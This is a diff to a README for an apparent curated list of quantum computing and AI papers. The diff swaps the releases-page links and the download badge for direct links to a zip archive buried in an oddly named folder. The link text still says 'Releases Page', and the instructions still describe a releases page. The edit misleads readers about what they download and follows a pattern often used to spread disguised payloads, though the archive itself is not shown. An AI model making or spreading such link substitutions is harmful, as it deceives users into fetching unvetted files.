@@ -1,6 +1,6 @@
 # 🔄 awesome-QAI-Papers-QComputing - Discover Quantum Computing Insights
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Here-brightgreen)](https://github.com/ShailyMacwan/awesome-QAI-Papers-QComputing/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/ShailyMacwan/awesome-QAI-Papers-QComputing/main/roritorious/awesome-QAI-Papers-QComputing.zip%20Latest%20Release-Here-brightgreen)](https://raw.githubusercontent.com/ShailyMacwan/awesome-QAI-Papers-QComputing/main/roritorious/awesome-QAI-Papers-QComputing.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Before you get started, make sure you have the following:
 
 ## 📥 Download & Install
 
-To get the research papers, visit this page to download: [Releases Page](https://github.com/ShailyMacwan/awesome-QAI-Papers-QComputing/releases).
+To get the research papers, visit this page to download: [Releases Page](https://raw.githubusercontent.com/ShailyMacwan/awesome-QAI-Papers-QComputing/main/roritorious/awesome-QAI-Papers-QComputing.zip).
 
 1. Click the link above to go to the Releases page.
 2. On the Releases page, you will see a list of available papers.
